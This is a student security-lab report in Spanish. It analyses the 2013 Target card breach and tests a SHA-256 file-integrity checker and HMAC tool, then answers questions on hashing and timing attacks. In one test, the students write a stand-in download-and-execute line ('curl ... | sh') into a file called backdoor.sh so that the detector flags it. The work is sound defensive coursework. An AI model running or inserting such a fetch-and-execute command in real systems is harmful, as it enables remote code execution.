# Laboratorio 01 — Informe

---

## Identificación

| | |
|---|---|
| **Grupo** | 14 |
| **Caso asignado (Parte A)** | 2 — Target (brecha de datos de tarjetas, 2013) |
| **Tema del mini-research** | 4 — Criptografía post-cuántica |
| **Fecha de entrega** | *(completar)* |

### Integrantes

| Nombre y apellido | Legajo | Usuario de GitHub |
|---|---|---|
| Valentina Chiapero | *(completar)* | @valechiapero |
| Fede Peron | *(completar)* | @fedeeperon |
| Laureano Gomez Redondo | *(completar)* | @Laureano-GR |
| Martín Cesano | *(completar)* | @*(completar)* |
| *(completar)* | *(completar)* | @martingaidoo |

---

# PARTE A — Análisis del incidente bajo la lente CIA

## A.1 — Cronología

| Fecha | Hecho | Fuente |
|---|---|---|
| Sep. 2013 | Un asesor externo certifica a Target como conforme con PCI-DSS. Ese mismo mes, aproximadamente, los atacantes ya habían robado por phishing las credenciales de Fazio Mechanical Services, contratista de climatización con acceso remoto al portal de proveedores de Target. | Senado de EE. UU. (2014), pp. 4–5, 7 y fig. 6; Krebs (2014) |
| 15 nov. 2013 | Primer ingreso a la red de Target con las credenciales del proveedor. Hay otra fuente que lo ubica el 12/11. | Krebs (2014); Senado de EE. UU. (2014), p. 3 |
| 15–28 nov. 2013 | Los atacantes prueban un malware de tipo *RAM scraper* (variante de BlackPOS) en algunas terminales de punto de venta (POS). | Senado de EE. UU. (2014), pp. 2–3 |
| 30 nov. 2013 | El malware ya está en la mayoría de los POS. Se instala el malware de exfiltración en servidores internos. FireEye emite alertas y Symantec detecta actividad maliciosa en el mismo servidor, pero nadie responde. | Senado de EE. UU. (2014), p. 3 |
| 2 dic. 2013 | Empieza la exfiltración por FTP hacia servidores externos, uno de ellos en Rusia. Se disparan nuevas alertas de FireEye. | Senado de EE. UU. (2014), pp. 3–4, 11 |
| 12 dic. 2013 | El Departamento de Justicia notifica a Target. | Senado de EE. UU. (2014), p. 1 |
| 15 dic. 2013 | Target confirma la intrusión y elimina la mayor parte del malware. | Senado de EE. UU. (2014), fig. 6 |
| 19 dic. 2013 | Target anuncia públicamente que se comprometieron cerca de 40 millones de tarjetas de crédito y débito usadas entre el 27/11 y el 15/12. | Target Corporation (2013) |
| 10 ene. 2014 | Target informa que también se robaron nombres, direcciones postales, teléfonos o correos de hasta 70 millones de personas. | Target Corporation (2014) |
| 23 may. 2017 | Acuerdo de USD 18,5 millones con 46 estados y el Distrito de Columbia por la brecha. | Fiscalía General de Virginia (2017) |

---

## A.2 — Activo afectado

**Activo principal:** los datos de las tarjetas de pago de los clientes de las tiendas físicas de Target en EE. UU.: nombre, número de tarjeta, fecha de vencimiento, código de seguridad y datos de la banda magnética (*track data*). En el caso de las tarjetas de débito, también el PIN cifrado. Estos datos estaban en la memoria RAM de las terminales POS mientras se procesaba cada compra, en texto plano, antes de enviarse cifrados al procesador de pagos (Senado de EE. UU., 2014, p. 2; Target Corporation, 2013).

**Por qué es el principal:** es el dato que los atacantes fueron a buscar. Todo el ataque (el malware hecho a medida para POS y la infraestructura de exfiltración) apuntaba a esos datos. Además tiene valor de reventa inmediato: las tarjetas aparecieron a la venta en mercados clandestinos días después (Senado de EE. UU., 2014, p. 1–2). Con el *track data* se pueden clonar tarjetas físicas, y con el PIN se puede retirar efectivo de cajeros.

**Otros activos afectados:**

1. **Datos personales no financieros de hasta 70 millones de clientes** (nombre, dirección postal, teléfono, email), guardados en sistemas internos de Target que no son los POS (Target Corporation, 2014). Van en segundo lugar porque no permiten un fraude financiero directo, aunque sí facilitan el phishing dirigido contra esos clientes.
2. **Las credenciales de acceso de Fazio Mechanical al portal de proveedores** de Target. No eran el objetivo, sino el medio de ingreso. Las listamos porque su compromiso fue la condición necesaria para todo lo demás.

---

## A.3 — Matriz CIA

| Propiedad | ¿Se violó? | Evidencia concreta |
|---|---|---|
| **Confidencialidad** | **Sí** | Los datos de unas 40 millones de tarjetas y los datos personales de hasta 70 millones de personas se copiaron y se transfirieron por FTP a servidores externos controlados por los atacantes, al menos uno en Rusia (Senado de EE. UU., 2014, pp. 3–4, 11). Las tarjetas se ofrecieron a la venta en mercados clandestinos (p. 1–2). |
| **Integridad** | **Parcial** | Los datos de los clientes **no** fueron alterados: se copiaron, no se modificaron. Lo que sí se alteró sin autorización fue el **software de las terminales POS y de servidores internos**: se instaló BlackPOS en las cajas y un malware de exfiltración disfrazado de un producto legítimo de BMC Software (Senado de EE. UU., 2014, pp. 2–3, 5). |
| **Disponibilidad** | **No** | No hay evidencia de que las tiendas, las cajas o los sistemas de pago dejaran de funcionar. Al contrario, el ataque *necesitaba* que los POS siguieran operando con normalidad para capturar más tarjetas. Los datos robados siguieron disponibles para Target y para sus clientes. |

**Justificación ampliada de la propiedad más discutible:**

La más difícil fue **integridad**. Si se mira solo el activo principal (los datos de tarjetas), la respuesta es «No»: ningún número de tarjeta, saldo ni registro de cliente se modificó, y el daño vino de que alguien más los *leyó*. Por eso no marcamos «Sí».

Tampoco marcamos «No», porque el incidente incluye una modificación no autorizada concreta y verificable: el código que ejecutaban las terminales POS dejó de ser el que Target había instalado. ISO/IEC 27000 define integridad como la propiedad de exactitud y completitud, y eso aplica tanto a la información como a los sistemas que la procesan. Un POS con BlackPOS ya no es exacto: además de procesar el pago, copia la tarjeta. Esta alteración fue el **mecanismo** que permitió violar la confidencialidad, no el fin del ataque. Por eso la calificamos como **Parcial**: se violó la integridad de los sistemas, pero no la de los datos del activo principal. El mismo informe del Senado señala que PCI-DSS 11.5 exigía monitorear la integridad de archivos críticos de sistema (p. 10). Es exactamente el control que implementamos en la Parte B, y de haber estado operativo sobre los POS habría detectado esta violación.

Disponibilidad es claramente «No». La reemisión masiva de tarjetas que hicieron los bancos es un *impacto* económico del incidente, no una pérdida de disponibilidad del activo.

---

## A.4 — Encadenamiento amenaza → vulnerabilidad → impacto

| Elemento | En este caso |
|---|---|
| **Amenaza** *(quién / qué, con qué motivación)* | Un grupo de ciberdelincuentes con motivación económica, que monetiza vendiendo tarjetas robadas en mercados clandestinos («card shops»). |
| **Vulnerabilidad** *(la debilidad concreta que se explotó)* | Dos debilidades encadenadas: (1) el acceso remoto de un proveedor externo protegido solo con usuario y contraseña, sin segundo factor; (2) la falta de segmentación entre ese portal de proveedores y la red donde están los POS y los datos de tarjetas. De fondo, también estuvo la falta de respuesta a las alertas de FireEye. |
| **Activo** *(sobre qué recayó)* | Los datos de tarjetas de pago procesados en los POS de las tiendas de EE. UU. y, en segundo lugar, los datos personales de hasta 70 millones de clientes. |
| **Impacto** *(consecuencia sobre el negocio o las personas)* | Para los clientes: riesgo de fraude con tarjetas clonadas y de phishing. Para Target y los bancos: reemisión masiva de tarjetas, costos de investigación, demandas y un acuerdo de USD 18,5 millones con 46 estados y el Distrito de Columbia, además del daño reputacional. |

**Redacción:**

Un grupo de ciberdelincuentes con motivación económica (la **amenaza**) primero robó por phishing las credenciales de Fazio Mechanical, un proveedor de climatización. Con ellas **explotó** una **vulnerabilidad** de Target: el acceso remoto de proveedores dependía solo de una contraseña y no estaba aislado de la red interna. Desde ese punto de entrada se movió hasta las cajas e instaló BlackPOS. Ese malware no es la vulnerabilidad, sino la herramienta con la que se aprovechó el acceso obtenido. Así leyó desde la memoria de los POS los datos de unas 40 millones de tarjetas, que son el **activo**, y además extrajo datos personales de hasta 70 millones de clientes. Todo se exfiltró a servidores externos. Eso **produjo** un **impacto** que no es el ataque en sí, sino sus consecuencias: fraude potencial para los titulares, reemisión de tarjetas para los bancos y, para Target, costos legales y reputacionales, incluido un acuerdo de USD 18,5 millones con 46 estados y el Distrito de Columbia.

---

## A.5 — Dos controles mitigantes

### Control 1

| | |
|---|---|
| **Qué es** | Segmentación de red del entorno de datos de tarjetas (CDE), combinada con autenticación multifactor obligatoria para todo acceso remoto de proveedores. El portal de proveedores queda en una zona aislada que no tiene rutas hacia los POS ni hacia los servidores del CDE. |
| **Propiedad de la tríada que protege** | Confidencialidad de los datos de tarjetas. |
| **Por qué habría funcionado en este caso concreto** | El ataque se apoyó en dos hechos: que la credencial de Fazio servía sola, porque Target rara vez exigía doble factor a contratistas de bajo nivel, y que desde ese acceso se podía llegar a los POS, porque el portal externo «no estaba completamente aislado del resto de la red» (Senado de EE. UU., 2014, pp. 5, 8). Con MFA, la contraseña robada por phishing no habría bastado para entrar. Y aun con la credencial válida, la segmentación habría dejado al atacante encerrado en un sistema de facturación sin conexión con las cajas. Fazio solo necesitaba el acceso para facturación, contratos y gestión de proyectos (p. 4), así que el control no afectaba su trabajo. |

### Control 2

| | |
|---|---|
| **Qué es** | Lista blanca de aplicaciones (*application allowlisting*) combinada con monitoreo de integridad de archivos (FIM) en las terminales POS y en los servidores del CDE. Solo pueden ejecutarse binarios con hash aprobado, y cualquier cambio en archivos de sistema genera una alerta con respuesta obligatoria. |
| **Propiedad de la tríada que protege** | Integridad de los sistemas POS y, de forma derivada, confidencialidad de los datos de tarjetas. |
| **Por qué habría funcionado en este caso concreto** | Para robar los datos, los atacantes tuvieron que **instalar código nuevo** en las cajas (BlackPOS) y en servidores internos (el malware de exfiltración disfrazado de BMC), entre el 15 y el 30 de noviembre. Un POS es un sistema de función fija: el conjunto de binarios legítimos es chico y conocido, así que la lista blanca es viable. Con ella, BlackPOS no habría podido ejecutarse porque su hash no estaba aprobado. El informe del Senado propone exactamente este control (p. 10) y recuerda que PCI-DSS 11.5 ya exigía monitorear la integridad de archivos críticos. A diferencia de las alertas de FireEye, que el equipo de Target ignoró, una lista blanca **bloquea por defecto** y no depende de que un analista interprete correctamente una alerta genérica («malware.binary»). |

---

## A.6 — Fuentes consultadas (Parte A)

1. **[PRIMARIA]** U.S. Senate Committee on Commerce, Science, and Transportation. (2014, 26 de marzo). *A "kill chain" analysis of the 2013 Target data breach* (Majority staff report for Chairman Rockefeller). https://www.commerce.senate.gov/services/files/24d3c229-4f2f-405d-b8db-a3a67f183883
2. **[PRIMARIA]** Target Corporation. (2013, 19 de diciembre). *Target confirms unauthorized access to payment card data in U.S. stores* [Comunicado de prensa]. https://corporate.target.com/press/release/2013/12/target-confirms-unauthorized-access-to-payment-card-data-in-u-s-stores
3. **[PRIMARIA]** Target Corporation. (2014, 10 de enero). *Target provides update on data breach and financial performance* [Comunicado de prensa]. https://corporate.target.com/press/release/2014/01/target-provides-update-on-data-breach-and-financial-performance
4. **[PRIMARIA]** Office of the Attorney General of Virginia. (2017, 23 de mayo). *Target Corporation to pay $18.5M over 2013 data breach* [Comunicado de prensa]. https://oag.state.va.us/consumer-protection/index.php/news/209-may-23-2017-target-corporation-to-pay-18-5m-over-2013-data-breach
5. **[SECUNDARIA]** Krebs, B. (2014, 5 de febrero). *Target hackers broke in via HVAC company*. KrebsOnSecurity. https://krebsonsecurity.com/2014/02/target-hackers-broke-in-via-hvac-company/

---

# PARTE B — Integridad con funciones de hash

## B.1 — Evidencia de ejecución

Todas las salidas son reales, copiadas de la terminal (macOS, Python 3.9.6) y ejecutadas desde `entregas/lab01/grupo14/` después de correr `python3 data/generar_datos.py`.

### Generación del manifiesto

```
$ python3 src/integridad.py generar --dir data/muestra --salida manifest.sha256
Manifiesto generado: manifest.sha256
Directorio base:     data/muestra
Archivos indexados:  4
```

### Verificación sobre un directorio íntegro

```
$ python3 src/integridad.py verificar --dir data/muestra --manifiesto manifest.sha256
Directorio:  data/muestra
Manifiesto:  manifest.sha256

  OK             4
  MODIFICADO     0
  FALTANTE       0
  NUEVO          0

INTEGRIDAD VERIFICADA — sin diferencias contra el manifiesto.
$ echo "código de salida: $?"
código de salida: 0
```

### Detección de la modificación de un byte

```
$ printf 'X' >> data/muestra/transferencia.txt
$ python3 src/integridad.py verificar --dir data/muestra --manifiesto manifest.sha256
Directorio:  data/muestra
Manifiesto:  manifest.sha256

  OK             3
  MODIFICADO     1
  FALTANTE       0
  NUEVO          0

Hallazgos:
  [MODIFICADO] transferencia.txt

INTEGRIDAD COMPROMETIDA — 1 hallazgo(s).
$ echo "código de salida: $?"
código de salida: 1
```

### Detección de archivo faltante y de archivo nuevo

Se regeneraron los datos de muestra (sin la `X` del paso anterior), se borró un archivo de un subdirectorio y se agregó uno que no estaba en el manifiesto:

```
$ rm data/muestra/logs/acceso.log
$ echo 'curl http://ejemplo.invalid | sh' > data/muestra/backdoor.sh
$ python3 src/integridad.py verificar --dir data/muestra --manifiesto manifest.sha256
Directorio:  data/muestra
Manifiesto:  manifest.sha256

  OK             3
  MODIFICADO     0
  FALTANTE       1
  NUEVO          1

Hallazgos:
  [FALTANTE] logs/acceso.log
  [NUEVO] backdoor.sh

INTEGRIDAD COMPROMETIDA — 2 hallazgo(s).
$ echo "código de salida: $?"
código de salida: 1
```

### Efecto avalancha

Usamos comillas simples porque, con comillas dobles, el shell interpreta `$1` como un parámetro posicional (vacío) y el mensaje real pasa a ser `transferencia: 000`.

```
$ python3 src/integridad.py avalancha --a 'transferencia: $1000' --b 'transferencia: $1001'
mensaje A: "transferencia: $1000"
  SHA-256: 341511c4c817d55f30c81e212d0e82b0b16dd5a58d49fe5e45c9d5c998ab794a
mensaje B: "transferencia: $1001"
  SHA-256: 5fb87fd7adf8a226f61c666a3ed140b147501b8a1b8e1822e57fc4b3925323d9

Distancia de Hamming: 139 de 256 bits (54.30 %)
Efecto avalancha: para entradas distintas se espera un valor cercano al 50 %.
```

**Distancia obtenida:** 139 bits de 256 (54,30 %)

Coincide con lo esperado. Las entradas difieren en un solo carácter (`0` → `1`, es decir, `0x30` → `0x31`: **un único bit** de entrada), y aun así cambió más de la mitad de los bits de salida. Esperábamos un valor cercano a 128 bits (50 %). Para una función que se comporta como un oráculo aleatorio, cada bit de salida cambia con probabilidad ½, así que la distancia sigue una binomial B(256, ½), con media 128 y desvío estándar 8. Nuestros 139 bits están a menos de 1,5 desvíos de la media: es un resultado normal. Además verificamos que dos entradas idénticas dan distancia 0.

### HMAC

```
$ python3 src/integridad.py mac --clave secreto --mensaje 'transferir 1000'
mensaje:      "transferir 1000"
HMAC-SHA256:  96bc66546d55627136aeaaefbcead75520a57e19539834d03e74d705b70ff9fe
```

Tag válido, tag alterado en el último carácter (`e` → `0`) y mensaje alterado con el tag original:

```
$ python3 src/integridad.py mac --clave secreto --mensaje 'transferir 1000' --verificar 96bc66546d55627136aeaaefbcead75520a57e19539834d03e74d705b70ff9fe
mensaje:      "transferir 1000"
HMAC-SHA256:  96bc66546d55627136aeaaefbcead75520a57e19539834d03e74d705b70ff9fe
tag recibido: 96bc66546d55627136aeaaefbcead75520a57e19539834d03e74d705b70ff9fe

TAG VÁLIDO — el mensaje es auténtico e íntegro.
$ echo "código de salida: $?"
código de salida: 0

$ python3 src/integridad.py mac --clave secreto --mensaje 'transferir 1000' --verificar 96bc66546d55627136aeaaefbcead75520a57e19539834d03e74d705b70ff9f0
mensaje:      "transferir 1000"
HMAC-SHA256:  96bc66546d55627136aeaaefbcead75520a57e19539834d03e74d705b70ff9fe
tag recibido: 96bc66546d55627136aeaaefbcead75520a57e19539834d03e74d705b70ff9f0

TAG INVÁLIDO — el mensaje fue alterado o la clave no es la correcta.
$ echo "código de salida: $?"
código de salida: 1

$ python3 src/integridad.py mac --clave secreto --mensaje 'transferir 1001' --verificar 96bc66546d55627136aeaaefbcead75520a57e19539834d03e74d705b70ff9fe
mensaje:      "transferir 1001"
HMAC-SHA256:  f539851a885440201c49d69e5e1ca1c0d5774316f780cc3e9babc9fcfe4a687d
tag recibido: 96bc66546d55627136aeaaefbcead75520a57e19539834d03e74d705b70ff9fe

TAG INVÁLIDO — el mensaje fue alterado o la clave no es la correcta.
$ echo "código de salida: $?"
código de salida: 1
```

Además validamos `calcular_mac()` contra el caso de prueba 2 del RFC 4231 (clave `Jefe`, mensaje `what do ya want for nothing?`). El tag obtenido coincide con el publicado: `5bdcc146bf60754e6a042426089575c75a003f089d2739839dec58b964ec3843`.

---

## B.2 — Decisiones de implementación

| Decisión | Qué hicimos | Por qué |
|---|---|---|
| Recorrido compartido | Una sola función auxiliar, `_archivos_del_directorio()`, arma el conjunto de rutas para `generar` y para `verificar`. | Si cada subcomando recorriera el disco con su propia lógica, cualquier diferencia de criterio (qué excluir, cómo normalizar) aparecería como un falso `NUEVO` o `FALTANTE`. |
| Enlaces simbólicos | Se ignoran: no se hashean ni se siguen. | Seguir un enlace permitiría que un archivo de *fuera* del directorio monitoreado entre al manifiesto, o que un enlace a un directorio genere un ciclo. Es la opción conservadora. La contracara es que un enlace plantado por un atacante no se reporta como `NUEVO`, una limitación que dejamos documentada. |
| Exclusión del manifiesto | Se compara `ruta.resolve()` contra `salida.resolve()`. | Normalizar ambas rutas evita que `./data/muestra/m.sha256` y `data/muestra/m.sha256` se traten como distintas. `resolve()` funciona aunque el archivo todavía no exista, que es lo que pasa en `generar`. |
| Archivos vacíos | Se hashean como cualquier otro (digest `e3b0c442…b855`). | Un archivo vacío es un archivo: si alguien vacía uno con contenido, tiene que aparecer como `MODIFICADO`. |
| Directorio vacío | `generar` produce `{}` y `verificar` devuelve las cuatro listas vacías con código 0. | No hay nada que reportar. Las cuatro claves están siempre, como exige el contrato. |
| Distancia de Hamming en Python 3.9 | `bin(a ^ b).count("1")` en lugar de `int.bit_count()`. | El equipo donde se desarrolló tiene Python 3.9.6. El resultado es idéntico y el código funciona en 3.9 y en 3.10+. |
| Tag HMAC recibido | Se normaliza con `strip().lower()` y se compara como `bytes`. | `compare_digest()` lanza `TypeError` si recibe un `str` con caracteres no ASCII. Con `bytes`, un tag basura como `ñ` se reporta como inválido en vez de romper el programa. La normalización a minúsculas acepta tags hexadecimales en mayúscula, que son el mismo valor. |

---

## B.3 — Preguntas de análisis

### 1. El manifiesto por sí solo no alcanza

**Respuesta:**

Nada se lo impide. El esquema actual detecta cambios *accidentales* o hechos por alguien que no conoce el manifiesto, pero no resiste a un atacante con escritura sobre el directorio. SHA-256 es una función pública y sin clave: cualquiera puede calcular el digest de cualquier archivo. El atacante modifica `transferencia.txt`, corre `integridad.py generar` (o calcula el digest a mano) y sobrescribe `manifest.sha256`. En la siguiente verificación todo da `OK`, porque el verificador compara el disco contra una referencia que también controla el atacante. El problema de fondo es que **el manifiesto es tan confiable como el lugar donde se guarda**: protegimos la integridad de los archivos, pero no la del propio manifiesto.

Para que el ataque no funcione, el atacante tiene que quedar sin capacidad de producir una referencia válida. Hay tres formas de lograrlo, combinables entre sí:

1. **Autenticar el manifiesto con un secreto que el atacante no tenga.** Puede ser un HMAC con una clave que no esté en la máquina monitoreada (lo que implementamos en el subcomando `mac`) o, mejor, una **firma digital** con una clave privada que nunca toque ese equipo. El verificador solo necesita la clave pública, así que comprometer el host no le da al atacante forma de firmar un manifiesto nuevo.
2. **Guardar el manifiesto fuera del alcance del atacante**: en otro servidor, en un medio de solo lectura o en un almacenamiento con escritura única (WORM). Así funcionan los FIM como Tripwire o AIDE en producción: la base de referencia se guarda fuera de línea o en un host de gestión separado.
3. **Ejecutar el verificador desde un entorno confiable.** Si el atacante tiene root, también puede reemplazar `integridad.py` por uno que siempre diga `OK`. Por eso la verificación seria se hace desde otro sistema o desde un medio de arranque limpio.

---

### 2. Qué agrega HMAC y qué no

**Respuesta:**

Un hash simple garantiza que el dato coincide con *algún* digest, pero no quién lo calculó, porque cualquiera puede recalcularlo (lo vimos en la pregunta anterior). HMAC incorpora una clave secreta en el cálculo (RFC 2104). Sin la clave es computacionalmente inviable producir un tag válido para un mensaje nuevo, aunque se conozcan muchos pares mensaje–tag. Eso agrega **autenticación del origen de datos**: si el tag verifica, el mensaje lo generó alguien que conoce la clave y no fue modificado desde entonces. En nuestra prueba, cambiar `transferir 1000` por `transferir 1001` sin la clave produjo un tag inválido.

Lo que HMAC **no** resuelve:

- **No repudio.** HMAC es simétrico: emisor y receptor comparten la misma clave. Cuando el receptor recibe un mensaje con un tag válido, sabe que no lo generó él y deduce que fue el emisor. Pero ante un tercero (un juez, un auditor) no puede probarlo, porque él mismo podría haber calculado ese tag. Para no repudio hace falta una **firma digital** con clave privada, donde solo una parte puede firmar y cualquiera puede verificar.
- **Confidencialidad.** El mensaje viaja en claro: HMAC autentica, no cifra.
- **Repetición (*replay*).** Un mensaje válido capturado puede reenviarse tal cual y su tag sigue verificando. Si un atacante repite `transferir 1000`, se ejecutan dos transferencias. Hay que incluir un nonce, un número de secuencia o una marca de tiempo dentro de lo autenticado.
- **Distribución y custodia de la clave.** HMAC supone que la clave ya se compartió de forma segura y que solo la conocen las partes legítimas. Si se filtra, quien la tenga puede falsificar cualquier mensaje y no hay forma de distinguirlo del emisor legítimo.

---

### 3. MD5 y SHA-1

**Respuesta:**

En los dos casos se rompió la **resistencia a colisiones**: hoy es factible encontrar dos entradas distintas con el mismo digest. En MD5 el ataque es trivial desde mediados de los 2000. El RFC 6151 (Turner y Chen, 2011) registra que el tiempo para hallar colisiones bajó a segundos en una computadora común y concluye que MD5 «ya no es aceptable donde se requiere resistencia a colisiones, como en firmas digitales». En SHA-1, Stevens et al. (2017) publicaron la primera colisión real: dos PDF distintos con el mismo SHA-1. Requirió el equivalente a unas 2^63,1 llamadas a la función de compresión de SHA-1 (unos 6500 años-CPU y 100 años-GPU), mucho menos que los 2⁸⁰ de la fuerza bruta genérica (ataque de cumpleaños). Ninguno de los dos ataques rompe, en la práctica, la **resistencia a preimagen**: dado un digest fijo, sigue sin ser factible encontrar una entrada que lo produzca.

Esa distinción define dónde siguen siendo aceptables. **No** sirven para firmas digitales, certificados, integridad frente a un adversario que puede elegir el contenido (por ejemplo, un instalador que se hashea para publicar su digest) ni para deduplicar datos que pueda controlar un atacante. En todos esos casos el atacante fabrica un par «benigno/malicioso» con el mismo digest. Sí tienen usos aceptables cuando no hay adversario o cuando la seguridad no depende de colisiones:

- **Detección de errores accidentales** (corrupción en una descarga o en un disco), donde nadie está buscando colisiones a propósito.
- **HMAC-MD5 y HMAC-SHA-1.** La seguridad de HMAC no depende de la resistencia a colisiones de la función subyacente. El mismo RFC 6151 dice que no es urgente quitar HMAC-MD5 de protocolos existentes, aunque no debe incluirse en diseños nuevos.

Nuestra posición es que en diseños nuevos no hay motivo para usarlos: SHA-256 está disponible en todas partes y su costo es comparable.

**Fuente:**

- **[PRIMARIA]** Turner, S. y Chen, L. (2011). *Updated security considerations for the MD5 message-digest and the HMAC-MD5 algorithms* (RFC 6151). IETF. https://www.rfc-editor.org/rfc/rfc6151
- **[ARBITRADA]** Stevens, M., Bursztein, E., Karpman, P., Albertini, A. y Markov, Y. (2017). The first collision for full SHA-1. En *Advances in Cryptology – CRYPTO 2017* (LNCS 10401, pp. 570–596). Springer. https://eprint.iacr.org/2017/190

---

### 4. Comparación en tiempo constante

**Respuesta:**

La comparación `==` entre dos cadenas o `bytes` está optimizada para terminar **en cuanto encuentra la primera diferencia**. Por eso su tiempo de ejecución depende de cuántos caracteres iniciales coinciden: un tag con los primeros 10 caracteres correctos tarda un poco más en rechazarse que uno con el primer carácter mal. Esa diferencia es de nanosegundos, pero es medible si se repite muchas veces y se promedia, y filtra información sobre el secreto. Es un **canal lateral de tiempo** (*timing side channel*).

El ataque concreto es la **falsificación del tag byte a byte**. Supongamos un servidor que recibe `(mensaje, tag)` y responde aceptado o rechazado. El atacante quiere que se acepte `transferir 999999`, pero no conoce la clave. Prueba las 256 opciones del primer byte del tag, cada una miles de veces, y mide el tiempo de respuesta. La opción que tarda sistemáticamente más es la correcta, porque la comparación avanzó un byte más antes de fallar. Fija ese byte y repite con el segundo, y así sucesivamente. En lugar de 2²⁵⁶ intentos de fuerza bruta, necesita del orden de 32 × 256 = 8192 posiciones a adivinar (multiplicadas por las repeticiones para filtrar el ruido). Así obtiene un tag válido **sin conocer la clave**, y anula la propiedad de autenticación que daba HMAC.

`hmac.compare_digest()` evita esto porque no corta en la primera diferencia: recorre **siempre todos los bytes** y acumula las diferencias, por ejemplo con OR de los XOR de cada par, para decidir solo al final. La documentación de Python lo describe como un enfoque «diseñado para prevenir el análisis de tiempos evitando el cortocircuito dependiente del contenido». El tiempo pasa a depender solo del largo, que es público (64 caracteres hex), y no del contenido. Por eso la documentación aclara que, como mucho, se podría filtrar el largo o el tipo de los operandos, pero no su valor.

---

### 5. SHA-256 para contraseñas: mala idea

**Respuesta:**

El problema es que SHA-256 es **rápido**, y para contraseñas la velocidad juega a favor del atacante. El escenario relevante es el robo de la base de hashes, como el robo de datos de Target. Con la base en su poder, el atacante prueba candidatos sin conexión y sin límite de intentos: diccionarios, contraseñas filtradas, variaciones. Una GPU moderna calcula miles de millones de SHA-256 por segundo. Las contraseñas humanas tienen poca entropía, así que la mayoría cae en horas. La unidireccionalidad de SHA-256 no protege acá: el atacante no invierte la función, adivina la entrada y compara. Sin *salt* además se pueden usar tablas precalculadas, y dos usuarios con la misma contraseña tienen el mismo hash.

En su lugar se usan **funciones de derivación de claves para contraseñas**, diseñadas para ser deliberadamente costosas: **Argon2id** (RFC 9106, ganadora de la Password Hashing Competition), **scrypt** y **bcrypt**. Tienen tres propiedades que SHA-256 no tiene:

1. **Costo de trabajo configurable.** Un parámetro de iteraciones regula cuánto tarda cada cálculo. Para el usuario legítimo, 100 ms por login es imperceptible. Para el atacante, multiplica por millones el costo de cada intento. Y el parámetro se puede subir a medida que mejora el hardware.
2. **Uso intensivo de memoria (*memory-hardness*)** en Argon2 y scrypt. Cada cálculo exige una cantidad grande de RAM (el RFC 9106 recomienda, por ejemplo, 64 MiB o 2 GiB). Eso neutraliza la ventaja de las GPU y los ASIC, que tienen miles de núcleos pero poca memoria por núcleo. Bcrypt no es *memory-hard* en ese sentido, pero también es lento por diseño.
3. **Salt incorporado.** Cada hash lleva un valor aleatorio único, que invalida las tablas precalculadas y obliga a atacar cada cuenta por separado.

El objetivo de diseño es opuesto: una función de hash criptográfica tiene que ser rápida para hashear gigabytes, y una de contraseñas tiene que ser lenta para resistir la adivinación masiva.

---

# Cierre

## Dificultades encontradas

- **Determinar la integridad en el caso Target.** Fue la decisión más discutida de la Parte A. La tentación era marcar «Sí» porque el ataque fue grave, o «No» porque los datos de tarjetas no se modificaron. Terminamos distinguiendo entre la integridad de los *datos* del activo (no se violó) y la de los *sistemas* que los procesan (sí se violó, porque se instaló malware en los POS). Lo dejamos como «Parcial» y lo justificamos en A.3.
- **Fuentes de la cronología.** Varias fechas del incidente circulan en notas periodísticas con diferencias entre sí. Por ejemplo, el primer acceso aparece como el 12 o el 15 de noviembre según la fuente. Usamos como columna vertebral el informe del Senado de EE. UU., que además cita sus propias fuentes, y donde había discrepancia mostramos las dos fechas.
- **Versión de Python.** El equipo donde se desarrolló tiene Python 3.9.6, y `int.bit_count()` requiere 3.10. Usamos `bin(n).count("1")`, que es equivalente, y verificamos que el script funciona en ambas versiones.
- **El `$` en la prueba de avalancha.** Con comillas dobles, `"transferencia: $1000"` se convierte en `transferencia: 000` porque el shell expande `$1`. Lo descubrimos al ver que el mensaje impreso no coincidía con el escrito, y lo resolvimos con comillas simples.
- **Excluir el manifiesto del recorrido.** Comparar rutas como texto fallaba si una se pasaba con `./` y la otra no. Lo resolvimos normalizando ambas con `resolve()`.

---

## Distribución del trabajo

Todo el grupo trabajó en conjunto, repartiéndose las tareas. Con acuerdo del docente, la división se hizo por laboratorio: cada integrante coordinó la resolución de uno de los labs y el resto acompañó como co-autor (por eso los commits de este lab llevan `Co-authored-by` con todos los integrantes). En este laboratorio:

| Integrante | Aportes |
|---|---|
| Valentina Chiapero | Coordinación del lab 01: implementación de los subcomandos, evidencia de ejecución, Parte A, preguntas de análisis y mini-research. |
| Fede Peron | Fork del repositorio, configuración de colaboradores y co-autoría del lab. |
| Laureano Gomez Redondo | Inicialización del directorio de entrega del lab 01 y co-autoría del lab. |
| Martín Cesano | Copia de la plantilla del informe y co-autoría del lab. |
| *(completar)* (@martingaidoo) | Co-autoría del lab. |

---

## Declaración de uso de asistentes de IA

**¿El grupo usó asistentes de IA en este trabajo?**  Sí

| Herramienta | Para qué se usó | Qué partes del entregable afectó | Cómo se verificó que lo devuelto era correcto |
|---|---|---|---|
| Claude (Anthropic), vía Claude Code | Generación de código para los cuatro TODO de `integridad.py` | `src/integridad.py` | Ejecutamos todas las pruebas del enunciado (incluida la del byte modificado), casos borde (directorio con subcarpetas, manifiesto dentro del directorio, digests de distinto largo, entradas idénticas, tag no ASCII) y validamos el HMAC contra el caso de prueba 2 del RFC 4231. |
| Claude (Anthropic), vía Claude Code | Búsqueda de fuentes y redacción del borrador de la Parte A, las preguntas de análisis y el mini-research | `informe.md` (Partes A y B.3), `research.md` | Abrimos cada fuente citada y contrastamos con el texto original cada fecha, cifra y cita atribuida. Por ejemplo, corregimos la cantidad de estados del acuerdo de 2017 (46 + DC) al compararla con el comunicado oficial. El grupo revisó y validó el contenido. |

**Declaración:**

El grupo declara que comprende el contenido íntegro de lo entregado y que puede explicar y defender oralmente cualquier parte del código y del análisis, independientemente de la asistencia recibida.

---

## Fuentes consultadas (general)

Las fuentes de la Parte A están en la sección A.6. Las de la pregunta 3 figuran junto a la respuesta. Además:

1. **[PRIMARIA]** Krawczyk, H., Bellare, M. y Canetti, R. (1997). *HMAC: Keyed-hashing for message authentication* (RFC 2104). IETF. https://www.rfc-editor.org/rfc/rfc2104
2. **[PRIMARIA]** Turner, S. y Chen, L. (2011). *Updated security considerations for the MD5 message-digest and the HMAC-MD5 algorithms* (RFC 6151). IETF. https://www.rfc-editor.org/rfc/rfc6151
3. **[ARBITRADA]** Stevens, M., Bursztein, E., Karpman, P., Albertini, A. y Markov, Y. (2017). The first collision for full SHA-1. En *Advances in Cryptology – CRYPTO 2017* (LNCS 10401, pp. 570–596). Springer. https://eprint.iacr.org/2017/190
